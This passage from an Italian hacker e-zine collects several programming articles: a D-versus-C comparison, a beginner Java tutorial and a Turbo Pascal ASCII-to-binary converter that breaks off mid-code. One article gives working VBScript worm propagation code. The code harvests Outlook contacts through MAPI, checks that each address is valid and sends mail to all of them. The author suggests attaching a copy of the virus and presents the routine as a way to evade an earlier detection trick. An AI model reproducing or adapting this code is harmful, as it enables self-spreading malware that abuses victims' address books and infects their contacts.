bit     1 bit                                                   *
byte    8 bit                                                   char
ubyte   unsigned 8 bit                                          unsigned char
short   16 bits                                                 short
ushort  unsigned 16 bit                                         unsigned short
int     32 bit                                                  int
uint    unsigned 32 bit                                         unsigned int
long    64 bit                                                  long long
ulong   unsigned 64 bit                                         unsigned long
long
cent    128 bit (ancora da implementare)                        *
ucent   Unsigned 128 bit (ancora da implementare)               *
float   32 bit floating point                                   float
double  64 bit floating point                                   double
real    80 bit per le cpu della intel                           long bouble
ireal   valore real immaginario                                 *
ifloat  valore float immaginario                                *
idouble valore double immaginario                               *
creal   complex real                                            *
cfloat  complex float                                           *
cdouble complex double                                          *
char    unsigned 8 bit UTF-8                                    *
wchar   unsigned 16 bit UTF-16                                  wchar_t
dchar   unsigned 32 bit UTF-32                                  wchar_t

Avete  presente quando si dichiarava in c unsigned int ? in D i valori  unsigned
hanno  già  un  loro  tipo,  e  sono  caratterizzati  dalla  u  prima  del  tipo
"classico".Ma  la  cosa  che mi stupisce di questo linguaggio  è  che  manca  il
preprocessore.Una cosa strana per l'evoluzione del c++.ad esempio per  importare
un header file non si userà più

#include <stdio.h>
#include "libreria.h"
#include <cartella/libreria.h>

ma semplicemente

import stdio;

da  notare  i ; alla fine e al mancanza del .h che indica gli header.  Però  per
indicare  che sono header provenienti dal c si userà la c prima del  package  ad
esempio

import c.stdio;

Non  vedremo più praticamente le simpatiche istruzionicon # prima. Per  definire
un costante al posto di

#define lino 85

si userà

constant int lino= 85;

e per creare degli alias tipo

#define int Int

si userà il comando appositò

alias int Int.

#if  #endif #else #define #undef #pragma etc non saranno più necessari, o meglio
in  alcuni  casi si dovra aver bisogno di creare delle funzioni che svolgano  il
lavoro  analogamente...  D tratta gli array in maniera  diversa  e  allo  stesso
tempo analoga...

int[120] array;

creerà un array di 120 caratteri. Per forza 120.

int[] array;

creerà un array vuoto. si possono mettere tutti i caratteri consentiti.

bit[120] array;

creerà un array di 120 bit.

int*[] array;

Creerà un array dinamico di puntatori.

int[8]* array;

Creerà  un  puntatore  ad un array int.Gli array hanno delle  proprietà  con  le
quali è possiblie interaggire attivamente:

- size = la dimesione dell'array
- lenght = la sua lunghezza
- dup = crea un array dinamico di x.lenght o di lunghezza definita e ci sposta i
suoi valori
-  reverse  =  l'ultimo  valore immesso sarà il primo e  così  via.  Restituisce
l'array
- sort = cambia il posto degli elementi nell'array.restituisce l'arrey ottenuto

per gli array dinamici invece :
- lenght = la sua lunghezza intesa come x.lenght = 9
- dup = crea un array dinamico di x.lenght o di lunghezza definita e ci sposta i
suoi valori
-  Reverse  =  l'ultimo  valore immesso sarà il primo e  così  via.  restituisce
l'array capovolto
- sort = cambia il posto degli elementi nell'array.restituisce l'arrey ottenuto

Il  vero  problema quando esce un linguaggio sul mercato è che  bisogna  fare  i
conti  con la compatibilità con il codice scritto.Col D questo problema  non  si
pone,o  meglio  molto  codice in c può essere usato in  D  Infatti  è  possibile
chiamare funzioni proprie del c usando

extern (C) int putchar(int d);

IL  D  come  tutti  i linguaggi di programmazione ha delle parole  e  dei  token
(Simboli o caratteri) riservati al linguaggio. Essi sono
abstract
aliasalign
asm
assert
auto
bit
body
break
byte
case
cast
catch
cent
char
class
cfloat
cdouble
creal
const
continue
dchar
debug
default
delegate
delete
deprecated
do
double
else
enum
export
extern
false
final
finally
float
for
function
super
null
new
short
int
long
ifloat
idouble
ireal
if
switch
synchronized
return
goto
struct
interface
import
static
override
in
out
inout
private
protected
public
invariant
real
this
throw
true
try
typedef
ubyte
ucent
uint
ulong
union
ushort
version
void
volatile
wchar
while
with

/
/=
.
..
...
&
&=
&&
|
|=
||
-
-=
--
+
+=
++
<
<=
<<
<<=
<>
<>=
>
>=
>>=
>>>=
>>
>>>
!
!=
!==
!<>
!<>=
!<
!<=
!>
!>=
(
)
[
]
{
}
?
,
;
:
$
=
==
===
*
*=
%
%=
^
^=
~
~=


Come  vedete  da quanto pare questo linguggio ha tutte le carte  in  regola  per
entrare  prepotentemente  nel mondo della programmazione.  Questo  articolo  era
solo  un  saggio,  idee  buttate la' e elaborate. Sicuramente  a  questo  numero
seguirà  un  vero  e  proprio  corso di programmazione,sempre  che  la  cosa  vi
interessi.Questo  documento  è  stato laborato  in  un  sol  giorno  per  motivi
editoriali  :)  quindi spero mi capiate se ho commesso errori  o  altro.  QUesto
articolo  ha  l'obbiettivo di farvi vedere le differenze  tra  D  e  C.Tutto  il
materiale   inerente   D   e   i  link  ad  altre  pagine   sono   presenti   su
www.digitalmars.com/d  Ho allegato a questo documento il compilatore,  scaricato
da www.opend.org



+--[PROGRAMMAZIONE]------------------------------------------------------[IL04]+
|  Titolo: E il worm si propaga con una routin di controllo                    |
|  Autore: Blacksword                                                          |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
********************************************************************************
*************************Disclaimer*********************************************
Io, blacksword autore di questo articolo non sono responsabile del possibile uso
improprio  che  verrà  fatto del seguente testo. Il seguente  articolo  è  stato
scritto a puro scopo informativo.
********************************************************************************

Ciao  ragazzi  eccomi  qua  un'altra volta in vostra compagnia.Questa  volta  ho
deciso  di  scrivere  un  articolo  su  un argomento  differente  a  quelli  che
solitamente tratto.Infatti ho deciso di parlare dei worm.Tutti hanno sicuramente
sentito parlare di questa particolarità di questi virus,e molti di voi credo che
hanno  avuto a che fare molto spesso con loro. Vi ricordate un articolo presente
nella  edizione dell'e-zine precedente in cui Cyber o Unrelated ,non sono sicuro
aveva  mostrato  un modo per sapere se un ipotetico worm installato  su  di  una
macchina  avesse dato inizio alla fase di replica? Se non lo ricordate andate  a
rileggerlo.  Ebbene  è possibile facilmente superare quel  piccolo  e  ingegnoso
trucchetto  presentatoci. Basta infatti una piccola routine di controllo,  e  il
worm  può continuare la sua fase di propagazione indisturbato.Ora spero  che  la
routine  che  sto per scrivere non venga utilizzato per scopi illeciti,  pensate
alle conseguenze che possono derivare se la si aggiunge ad altre poche righe  di
codice  nocivo.Ho  deciso di utilizzare per l'occasione il visual  basic  script
perchè permette di raggiungere lo scopo in maniera facile e veloce:

function control(indr)
if ( instrRev(indr,"@") ) then
pos = instr(indr,"@")
pos1 = instr(indr,".")
pos2 = len(indr) - pos1
if ( (pos1 = 0 ) OR ( pos1 = pos + 1 ) OR ( pos2 < 2 ) ) then
go = 0
else
go = 1
end if
else
go = 0
end if
end function

Set Oo = CreateObject("Outlook.Application")
Set Om = Oo.GetNamespace("MAPI").GetDefaultFolder(10).Items
n = Om.Count
For i = 1 To n
inc = inc + 1
addrs = Om.Item(inc).Email1Address
addrs1 = Om.Item(inc)
control(addrs)
if ( go = 1 ) then
Set Mailtosend = Oo.CreateItem(0)
            Mailtosend.Recipients.Add (addrs1)
            Mailtosend.Subject = "Attenzione"
            Mailtosend.Body ="Infezione virus"
            Mailtosend.Send
end if
next
Set Client = Nothing
Set Address = Nothing

Ora io non vorrei spiegare alla lettera l'intero codice. Esporrò una spiegazione
a  grandi  linee. La parte più importante del seguente codice è  sicuramente  la
funzione control.Essa infatti non fa altro che controllare se l'indirizzo e-mail
è  un  indirizzo  valido.Se  il controllo risulta positivo  allora  la  funzione
imposta  la variabile go = 1, nel caso contrario la variabile è settata  a  0.La
seconda  parte dello script invece Non fa altro che creare delle e-mail con  gli
indirizzi  validi.Qui il codice non fa altro che inviare delle e-mail  con  puro
testo.Ma  si potrebbe aggiungere un mailtosend.Attachments per mandare un  file,
oppure  la copia del virus.Una cosa, la propagazione in questo caso può avvenire
solo  con Outlook.Avete mai pensato al fatto che queste poche righe che sembrano
all'apparenza insignificanti, incomprensibili per molti,possono trasformarsi  in
un processo di propagazione virale????????


+--[PROGRAMMAZIONE]------------------------------------------------------[IL04]+
|  Titolo: JAVA PROGRAMMING  BOOK vr. 1.0.0                                    |
|  Autore: SysOv3rrid3                                                         |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+

--------------------------------------------------------------------------
--------------------------------------------------------------------------

JAVA PROGRAMMING  BOOK vr. 1.0.0
                 written by SysOv3rrid3


 >SOMMARIO:

1.  What's Java
 1.1 Gli strumenti per il lavoro
 1.2 La struttura dei programmi
2.  I dati e la dichiarazione di variabili e costanti
3. Gestione degli Input/Output
4. Le strutture di controllo
5. Piccolo programma riassuntivo
- allegati
Sorgente esempio relativo bytecode.



-------------------
|  DESCLAIMER     |
-------------------

Tutte   le   informazioni  contenute  in  questo  file   sono   a   puro   scopo
didattico/informativo,  quindi l'autore non si ritiene  responsabile  per  l'uso
improprio da parte di terzi delle informazioni qui contenute.

1. WHAT'S JAVA
Java  è  un linguaggio di programmazione di alto livello, nato con lo  scopo  di
sviluppare  applicazioni per la rete (APPLET), questo linguaggio fà  riferimento
al      paradigma   della   programmazione  ad   oggetti,   e   si   è   diffuso
contemporaneamente al C++.  La caratteristica del Java è data dal fatto  che  il
suo  codice  è    perfettamente portatile, cioè il sorgente di un programma  può
essere  compilato o sotto Windows o sotto Linux, senza che venga generato nessun
tipo  di  errore.A cosa è dovuto questa portabilità del codice? La  risposta  è:
BYTECODE.  E  cos'è il bytecode? Non è altro che il risultato della compilazione
del codice sorgente  Java, questo è un formato intermedio del tutto indipendente
dalla  piattaforma software dov'è compilato ed è usato per trasportare il codice
tra  varie  piattaforme hardware/software.Per essere eseguito  poi  il  bytecode
dovrà  essere  interpretato.  ATTENZIONE in  java  non  si  posso  creare  degli
eseguibili  .exe,  perciò esecuzione del codice è  legata  alla  presenza  della
VIRTUAL  MACHINE che interpreterà il bytecode. Di solito una Virtual Machine   è
implementata   in   ogni  browser  per  la  navigazione  in    internet,   vista
l'attitudine del linguaggio allo sviluppo di applicazioni per il web.

1.1 GLI STRUMENTI PER IL LAVORO
Per  porter  programmare  in  Java è necessario avere i  seguenti  strumenti  di
sviluppo:
1. un editor di testi;
2. un compilatore e un interprete facilmente reperibili su internet;
3. un browser abilitato ad eseguire le applet.

1.2 LA STRUTTURA DEI PROGRAMMI
In  java  ogni  applicazione è costituita da una o più classi, tra tutte  quella
principale  è  quella  contenete  in  metodo 'main()';  in  quanto  l'esecuzione
dell'applicazione inizia proprio da quella classe. Le fasi dello sviluppo di una
applicazione in java sono le seguenti: la fase di scrittura del codice  sorgente
tramite  un  semplice  editor  di  testi, il  file  contente  il  sorgente  avrà
estensione .java; poi si passerà alla fase di compilazione: il compilatore dovra
essere  chiamato da riga di comando nel seguente modo:  javac <nome  file>,  es.
c:\jbuilder7\jdk1.3.1\bin>  javac  prova.java  (io  uso  Java  Development   Kit
[abbreviato  JDK] della Borland); se la compilazione avrà succeso  allora  verrà
prodotto  il  BYTECODE, costituito da un file di estensione .class, l'interprete
verrà    chiamato    nel    seguente    modo:    java    <nome    file>,     es.
c:\jbuilder\jdk1.3.1\bin> java prova, a questo punto il programma verrà avviato.

ALCUNE PRECISAZIONI:
-  il  nome  del bytecode (nell'esempio prova) corrisponde al nome della  classe
dove è presente il metodo main, e dovrà essere passato all'interprete java senza
l'estensione .class;
-  il  Java  è  un  linguaggio CASE-SENSITIVE, questo vuol dire che  esiste  una
differenza  tra MAIUSCULO  e minuscolo, perciò Prova è diverso  da  prova  e  da
PrOvA.
-l'ambiente di programmazione Java  include anche delle raccolte di  classi  e/o
metodi   già   implementati,dette  librerie,  queste  devono  essere   importate
all'inizio del programma nel seguente modo: import <nome libreria>;.

 Le principali librerie sono:
-  java.lang  > collezioni di classi di base presente in ogni applicazione  (non
deve essere importata perchè è presente di default)
- java.io > libreria riguardante la gestione dei flussi Input/Output
- java.awt > lireria contenete le classi per i componenti grafici
- java.net > libreria di classi per la rete

ESEMPIO DI PICCOLO PROGRAMMA IN JAVA:

class Prova
{
 public static void main(string args[])
 {
   System.out.println("Hello word");
 }
}


ANALISI Programma:
1  riga:  class Prova, indica il nome della classe(nome che verrà attribuito  al
Bytecode)
2  riga:   public  static  void main(string args[]),  public  static  void  sono
proprietà  del  metodo main, in particolare: public > indica  che  il  metodo  è
pubblico;   static>  indica che non può essere richiamato  dagli  oggetti  della
stessa  classe(Consulta  manuali sulla programmazione  ad  oggetti);   void  >il
metodo non ha valori di ritorno; main> è il metodo che all'interprete che quella
è  la classe principale, ha come parametri un array di stringa che corrisponde a
valori immessi da linea di                comando;
3 riga: System.out.println("Hello world"), costituisce lo standard di output (la
gestione  degli  I/O  è  spiega successivamente), che stamperà  sul  monitor  la
classica  scritta  Hello  world Le parentesi graffe {}  vengono  utilizzate  per
individuare il BLOCCHI, cioè degli  insiemi di operazioni.


@@@@@@@@@@@@@@@@@@@@@@@@@@@@


2.I DATI LA DICHIARAZIONE DI VARIABILI E COSTANTI
Tra i tipi di dato presenti nel java ci sono:
- i tipi primitivi: numerici, booleani, carattere;
- i tipi riferimento: array e classi.
~*~ I TIPI PRIMITIVI ~*~
- i tipi numerici: si dividono in interi e a virgola mobile

INTERI:
byte----> 8 bit
short---->16 bit
int------> 32 bit
long----->64 bit

VIRGOLA MOBILE:
float----> 32 bit
double---->64bit

- i tipi booleani: possono assumere solo due tipi di valore
 boolean  ->true
        ->false

-  i  tipi  carattere: sono indicati dalla parola chiave char ed occupano 16 bit
in  quanto  vengono  codificati secondo la standard UNICODE  e  non  ASCII,   le
stringhe  non  sono un tipo di dato predefinito ma sono definite dalla  apposita
classe String

La   dichiarazione   delle  variabili  avviene  nel   seguente   modo:    <tipo>
<identificatore> = <valore iniziale> La dichiarazione della costanti avviene nel
seguente modo: final <tipo>
<identificatore> = <valore costante>

ESEMPI DI DICHIARAZIONE DI DATI:
Variabili
 byte a=0;
 int B=5;
 float numero = 0.0;
 double abc = 25.6;
 char lettera= 'c';
 String nome="";
 boolean primo= false;

Costanti
 final int numero=6;
 final char adc='h';

GLI OPERATORI IN JAVA
Gli operatori aritmetici sono: +, -, *, /, %(modulo)
Gli operatori di incremento e decremento sono: ++, --
L'operatore di assegnamento è =, mentre quello di concatenazione tra stringhe e
variabili è +
esempio:
----------------------
int num;
int ris;

num=10;
ris= num++ - 3;
-----------------------
la variabile num sarà 11, ma la variabile ris sarà uguale a 7, mentre

---------------------
int num;
int ris;

num=10;
ris= ++num - 3;
-----------------------
num sarà uguale a 11, ma ris sarà uguale a 8.


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

3.  GESTIONE DEGLI INPUT/OUTPUT
Lo  standard  di output è rappresentato dall'oggetto System.out,  al  quale  può
essere  associato il metodo println() o print(), in entrambi i casi il parametro
da passare consiste nel messaggio da visualizzare:

 ESEMPIO
   System.out.println("Questa  è  una prova"+ABC);  nell'esempio  oltre  che  al
messaggio  'Questa è una prova' verrà visualizzato il contenuto  della  varibile
ABC (si noti l'uso dell'operatore di concatenazione).

Per  quanto riguarda l'input la questione si complica, l'oggetto che viene usato
è   di  classe  BufferedReader,  esso  viene  definito  riferendosi  all'oggetto
System.in
nel seguente modo:
------
InputStreamReader input = new InputStreamReader(System.in);
BufferedReader tastiera = new BufferedReader(input);
------
con  ciò  si  crea un nuovo oggetto tastiera che utilizzeremo per l'acquisizione
dati  tramite  il metodo readLine(). ATTENZIONE IL METODO readLine()  ACQUISISCE
SOLO STRINGHE PERCIò SE L'ACQUISIZIONE RIGUARDA DATI NUMERICI DOVRà ESSERE FATTA
UNA CONVERSIONE.

Conversione di una stringa in un numero intero
----
String Numero;
int Num;

Numero = tastiera.readLine();
Num = Integer.valueof(Numero).intValue();
-----

per la conversione in double o float
----
String Numero;
double o float  Num;


Numero = tastiera.readLine();
Num =Double.valueof(Numero).doubleValue();
oppure
Num = Float.valueof(Numero).floatValue();
------
RICORDA:   in  tutte  le  applicazioni  Java  nelle  quali  ci  sono  operazioni
riguardanti  l'input dovrà essere inclusa la libreria che gestisce  le  suddette
operazioni e cioè, la prima riga di codice deve essere import java.io.*;

COMMENTI:
Importanti per la comprensione del  codice sono i commenti, in Java ve  ne  sono
di tre tipi:
//commento su una riga
/*commento su più righe*/
/**idem*/

n.b.
se la gestione degli input/output non fosse stata molto chiara(Sorry!!!:),
potete vedere l'esempio a fine guida, spero vi chiarisca le idee.


@@@@@@@@@@@@@@@@@@@@@@

LE STRUTTURE DI CONTROLLO
Le  strutture  di controllo fondamentali solo: la sequenziale (non necessita  di
particolari attenzioni), la struttura di selezione e l'iterativa.

*STRUTTURA DI SELEZIONE
if (condizione)
{
 //qua vanno inserite le istruzioni se la condizione è vera
}
[else
{
 //qua vanno inserite le istruzioni se la condizione è falsa
}]

il blocco tra [] può anche essere omesso se non risulta essere necessario.

*STRUTTURA ITERATIVA PER VERO
while (condizione)
{
 //mentre la condizione risulta vera verranno ripetutamente eseguite le
istruzioni del blocco finche questa non risulti falsa
}

Oltre a queste strutture (cosiddette fondamentali della programmazione) esistono
quelle derivate, e cioè: selezione multipla, iterativa per falso e iterativa con
contatore.

*SELEZIONE MULTIPLA
switch (variabile)
{
 case valore1: //istruzioni
        break;
 case valore2: //istruzioni
        break;
 case valore n: //istruzioni
        break;
 default: // istruzioni
    break;
}

La variabile che segue la parola chiave switch di solito è un numero intero o un
carattere,  tra le {} ci sono i possibili valori che può assumere,  in  base  al
valore che essa assumerà verranno svolte determinate istruzioni, nel caso in cui
nessun  valore  del blocco corrisponde a quello della variabile allora  verranno
svolte  le  istruzioni che seguono la parola chiave default.  La  parola  chiave
BREAK indica la fine di un blocco di operazioni.

*ITERATIVA PER FALSO
do
{
  //le istruzioni del blocco verranno ripetute finché la condizione nn risulterà
vera
}
while (condizione);


*ITERATIVA CON CONTATORE
for(inizializzazione; condizione; aggiornamento)
{
 //istruzioni
}

INIZIALIZZAZIONE:  questa operazione viene eseguita una  sola  volta,  prima  di
entrare  nel  ciclo  FOR  e consiste nel dichiarare una  variabile  locale  (che
fungerà  da  contatore)e  inizializzarla.  CONDIZIONE: questa  condizione  verrà
verificata  ad ogni inizio ciclo, se  risulterà falsa l'iterazione  si  fermerà,
mentre se risulterà vera continuerà ad  iterare.
AGGIORNAMENTO: consiste nell'incrementare o decrementare, di solito di 1  unità,
la variabile locale dichiarata, finito l'incremento si verificherà nuovamente la
condizione per stabilire se dovrà essere effettuato il ciclo.

ESEMPIO
-------
for(int i=1; i <= 10; i++)
 {
  System.out.println(i);
 }
-------
Questo segmento di codice produrrà in output i primi 10 numeri naturali.


OPERATORI BOOLEANI

&& => AND (si usa maggiormente)
& => AND
|| => OR (si usa maggiormente)
| => OR
! => NOT

OPERATORI LOGICI

< MINORE
> MAGGIORE
<> DIVERSO
== UGUALE
<= MINORE-UGUALE
>= MAGGIORE-UGUALE

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
PICCOLO PROGRAMMA RIASSUNTIVO:
Traccia:  calcola l'età media di 5 persone (il numero delle persone si consideri
come costante).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

import java.io.*; //Includiamo la libreria per la gestione degli I/O
class Prova //definiamo la classe principale
{
  public static void main(String args[]) //Dichiarazione del metodo main
  {
    /*impostazioni dello standard di input*/
     InputStreamReader input = new InputStreamReader(System.in);
     BufferedReader tastiera = new BufferedReader(input);

    /*dichiarazione dati*/
     final int Max = 5; //questa è una costante
     int Eta=0;
     int TotEta=0;
     int EtaMedia=0;

     /*Acquisizione dell'età di 5 persone*/
     //utilizziamo un'iterativa con contatore
     for(int i=1; i<=Max; i++)
     {
       System.out.println("Inserire l'eta' della " + i + " persona");
       /*lettura input*/
       try
       {
        String EtaLetta = tastiera.readLine();
        Eta=Integer.valueOf(EtaLetta).intValue();
       }
       catch (Exception e) {}
       /*incremento accumulatore*/
        TotEta += Eta;   //TotEta+= Eta equivale a TotEta = TotEta+Eta
     }
      /*Calcolo e comunicazione dell'età media*/
      EtaMedia = TotEta / Max;
      System.out.println("L'eta' media e': "+ EtaMedia);
   }
}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
LE ECCEZIONI:
 Durante l'esecuzione dei programmi può verificarsi un'anomalia, che può portare
all'interruzione  dell'esecuzione  del  programma,  per  ovviare  a  questo   in
conveniente in java è possibile usare il costrutto try...catch...; se avviene un
blocco all'interno del blocco try il controllo passa al blocco catch

try
{
 //blocco istruzioni
}
catch (eccezione)
{
 //operazioni da svolgere nel caso in cui si verifichi una eccezione
}

Tra le parentesi () deve essere inserito il tipo di eccezione che può
verificarsi, le più importanti sono: ArithmeticException, IOException,
NullPointerException, ecc...


................................................................................
................................................................................
...........
CONCLUSIONI:
termina  qui  la  prima  parte di questa guida dedicata completamente  al  Java,
logicamente  la  grande potenzialità del java non è di sicuro quella  descritta.
Per chi volesse continuare lo studio di questo linguaggio su Internet i tutorial
sono infiniti, in particolare vi consiglio di leggere e approfondire il discorso
sulla  programmazione ad oggetti, classi ,metodi e attributi per poter  arrivare
alle  interfacce  grafiche. Spero sia stato chiaro nello spiegare  gli  elementi
fondamentali,  forse  un  giorno  scriverò la  seconda  parte.Un  ringraziamento
particolare  va a Cyberdude che mi ha permesso di scrivere su questa  e-zine,  e
perché  anche lui crede nell'informazione libera!!! SPECIAL THANKS to: Cyberdude
e tutto il team di InformazioneLibera.
SALUTI al: chan di #Hacker.it, #Sh3ll, #InformazioneLibera

CONTACT me:
#Hacker.it
#InformazioneLibera
#Sh3ll
mail: SysOverride@libero.it



+--[PROGRAMMAZIONE]------------------------------------------------------[IL04]+
|  Titolo: Converter AScii2Binary in Turbo pascal                              |
|  Autore: Eimiar                                                              |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
 +----------------------------------------------------------------------------+
 |P.S. pre scrittum                                                           |
 |KoRnuto cambia nick, d'ora in poi sarà Eimiar                               |
 |                                                                            |
 | KORNUTO - 7H3 N4M3 WR073 0N 7H3 5M0K3                                      |
 | ...PrEsEnTs...                                                             |
 |                                                                            |
 |0100010101101001011011010110100101100001011100100100010101101001011011010110|
 |1001011  CREIAMO UN CONVERTITORE DI ASCII IN BINARIO IN TURBO PASCAL  000101|
 |0110100101101101011010010110000101110010010001010110100101101101011010010110|
 |                                                                            |
 |                                                                            |
 |                   /¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\                   |
 |                   |  /¯\                               |                   |
 |                   | / | \      ATTENZIONE!!!!          |                   |
 |                   |/  o  \                             |                   |
 |                   |¯¯¯¯¯¯¯                             |                   |
 |                   | IL SISTEMA HA RILEVATO LA PRESENZA |                   |
 |                   |           DI ALLEGATI!             |                   |
 |                   |         __________________         |                   |
 |                   |        /                  \        |                   |
 |                   |        |        OK        |        |                   |
 |                   |        \__________________/        |                   |
 |                   \____________________________________/                   |
 |Allegati:                                                                   |
 | - F2B.EXE                                                                  |
 | - B2F.EXE                                                                  |
 | - Sorgente2.gif                                                            |
 |                                                                            |
 | INTRODUCTION! (è inglish ma è più figo!)                                   |
 |Questo programma mi è venuto in mente leggendo la famosa E-Zine NETRUNNERS  |
 |(come il convertitore di Ascii in numeri) quindi ringrazio tutta la band    |
 |SPP per l'idea :D                                                           |
 |                                                                            |
 |Beh, ora mettiamoci al lavoro                                               |
 |Vi premetto che qui, non ho messo nessun tipo di Algoritmo... solo TANTE    |
 |righe di codice tutto pieno di IF!!!!                                       |
 |quindi, non lamentatevi con me perché sono poco matematico :D               |
 |                                                                            |
 +----------------------------------------------------------------------------+
 |{progetto Ascii to Binary}                                                  |
 |program F2B;                                                                |
 |uses crt;                                                                   |
 |                                                                            |
 |var                                                                         |
 |A:file of byte;                                                             |
 |B:text;                                                                     |
 |C:byte;                                                                     |
 |D:string;               {il numero in binario}                              |
 |module:integer;                                                             |
 |indice:integer;                                                             |
 |                                                                            |
 |INPUT:STRING;                                                               |
 |OUTPUT:STRING;                                                              |
 |                                                                            |
 |begin                                                                       |
 |clrscr;                                                                     |
 |write('Inserisci il file sorgente: ');                                      |
 |readln(INPUT);                                                              |
 |write('Inserisci il file destinazione: ');                                  |
 |readln(OUTPUT);                                                             |
 |                                                                            |
 |assign(A,INPUT);                                                            |
 |assign(B,OUTPUT);                                                           |
 |reset(A);                                                                   |
 |rewrite(B);                                                                 |
 |while not eof(A) do                                                         |
 | begin                                                                      |
 |  read(A,C);                                                                |
 |  if C=0   then D:='00000000'; if C=1   then D:='00000001';                 |
 |  if C=2   then D:='00000010'; if C=3   then D:='00000011';                 |
 |  if C=4   then D:='00000100'; if C=5   then D:='00000101';                 |
 |  if C=6   then D:='00000110'; if C=7   then D:='00000111';                 |
 |  if C=8   then D:='00001000'; if C=9   then D:='00001001';                 |
 |  if C=10  then D:='00001010'; if C=11  then D:='00001011';                 |
 |  if C=12  then D:='00001100'; if C=13  then D:='00001101';                 |
 |  if C=14  then D:='00001110'; if C=15  then D:='00001111';                 |
 |  if C=16  then D:='00010000'; if C=17  then D:='00010001';                 |
 |  if C=18  then D:='00010010'; if C=19  then D:='00010011';                 |
 |  if C=20  then D:='00010100'; if C=21  then D:='00010101';                 |
 |  if C=22  then D:='00010110'; if C=23  then D:='00010111';                 |
 |  if C=24  then D:='00011000'; if C=25  then D:='00011001';                 |
 |  if C=26  then D:='00011010'; if C=27  then D:='00011011';                 |
 |  if C=28  then D:='00011100'; if C=29  then D:='00011101';                 |
 |  if C=30  then D:='00011110'; if C=31  then D:='00011111';                 |
 |  if C=32  then D:='00100000'; if C=33  then D:='00100001';                 |
 |  if C=34  then D:='00100010'; if C=35  then D:='00100011';                 |
 |  if C=36  then D:='00100100'; if C=37  then D:='00100101';                 |
 |  if C=38  then D:='00100110'; if C=39  then D:='00100111';                 |
 |  if C=40  then D:='00101000'; if C=41  then D:='00101001';                 |
 |  if C=42  then D:='00101010'; if C=43  then D:='00101011';                 |
 |  if C=44  then D:='00101100'; if C=45  then D:='00101101';                 |
 |  if C=46  then D:='00101110'; if C=47  then D:='00101111';                 |
 |  if C=48  then D:='00110000'; if C=49  then D:='00110001';                 |
 |  if C=50  then D:='00110010'; if C=51  then D:='00110011';                 |
 |  if C=52  then D:='00110100'; if C=53  then D:='00110101';                 |
 |  if C=54  then D:='00110110'; if C=55  then D:='00110111';                 |
 |  if C=56  then D:='00111000'; if C=57  then D:='00111001';                 |
 |  if C=58  then D:='00111010'; if C=59  then D:='00111011';                 |
 |  if C=60  then D:='00111100'; if C=61  then D:='00111101';                 |
 |  if C=62  then D:='00111110'; if C=63  then D:='00111111';                 |
 |  if C=64  then D:='01000000'; if C=65  then D:='01000001';                 |
 |  if C=66  then D:='01000010'; if C=67  then D:='01000011';                 |
 |  if C=68  then D:='01000100'; if C=69  then D:='01000101';                 |
 |  if C=70  then D:='01000110'; if C=71  then D:='01000111';                 |
 |  if C=72  then D:='01001000'; if C=73  then D:='01001001';                 |
 |  if C=74  then D:='01001010'; if C=75  then D:='01001011';                 |
 |  if C=76  then D:='01001100'; if C=77  then D:='01001101';                 |
 |  if C=78  then D:='01001110'; if C=79  then D:='01001111';                 |
 |  if C=80  then D:='01010000'; if C=81  then D:='01010001';                 |
 |  if C=82  then D:='01010010'; if C=83  then D:='01010011';                 |
 |  if C=84  then D:='01010100'; if C=85  then D:='01010101';                 |
 |  if C=86  then D:='01010110'; if C=87  then D:='01010111';                 |
 |  if C=88  then D:='01011000'; if C=89  then D:='01011001';                 |
 |  if C=90  then D:='01011010'; if C=91  then D:='01011011';                 |
 |  if C=92  then D:='01011100'; if C=93  then D:='01011101';                 |
 |  if C=94  then D:='01011110'; if C=95  then D:='01011111';                 |
 |  if C=96  then D:='01100000'; if C=97  then D:='01100001';                 |
 |  if C=98  then D:='01100010'; if C=99  then D:='01100011';                 |
 |  if C=100 then D:='01100100'; if C=101 then D:='01100101';                 |
 |  if C=102 then D:='01100110'; if C=103 then D:='01100111';                 |
 |  if C=104 then D:='01101000'; if C=105 then D:='01101001';                 |
 |  if C=106 then D:='01101010'; if C=107 then D:='01101011';                 |
 |  if C=108 then D:='01101100'; if C=109 then D:='01101101';                 |
 |  if C=110 then D:='01101110'; if C=111 then D:='01101111';                 |
 |  if C=112 then D:='01110000'; if C=113 then D:='01110001';                 |
 |  if C=114 then D:='01110010'; if C=115 then D:='01110011';                 |
 |  if C=116 then D:='01110100'; if C=117 then D:='01110101';                 |
 |  if C=118 then D:='01110110'; if C=119 then D:='01110111';                 |
 |  if C=120 then D:='01111000'; if C=121 then D:='01111001';                 |
 |  if C=122 then D:='01111010'; if C=123 then D:='01111011';                 |
 |  if C=124 then D:='01111100'; if C=125 then D:='01111101';                 |
 |  if C=126 then D:='01111110'; if C=127 then D:='01111111';                 |
 |  if C=128 then D:='10000000'; if C=129 then D:='10000001';                 |
 |  if C=130 then D:='10000010'; if C=131 then D:='10000011';                 |
 |  if C=132 then D:='10000100'; if C=133 then D:='10000101';                 |
 |  if C=134 then D:='10000110'; if C=135 then D:='10000111';                 |
 |  if C=136 then D:='10001000'; if C=137 then D:='10001001';                 |
 |  if C=138 then D:='10001010'; if C=139 then D:='10001011';                 |
 |  if C=140 then D:='10001100'; if C=141 then D:='10001101';                 |
 |  if C=142 then D:='10001110'; if C=143 then D:='10001111';                 |
 |  if C=144 then D:='10010000'; if C=145 then D:='10010001';                 |
 |  if C=146 then D:='10010010'; if C=147 then D:='10010011';                 |
 |  if C=148 then D:='10010100'; if C=149 then D:='10010101';                 |
 |  if C=150 then D:='10010110'; if C=151 then D:='10010111';                 |
 |  if C=152 then D:='10011000'; if C=153 then D:='10011001';                 |
 |  if C=154 then D:='10011010'; if C=155 then D:='10011011';                 |
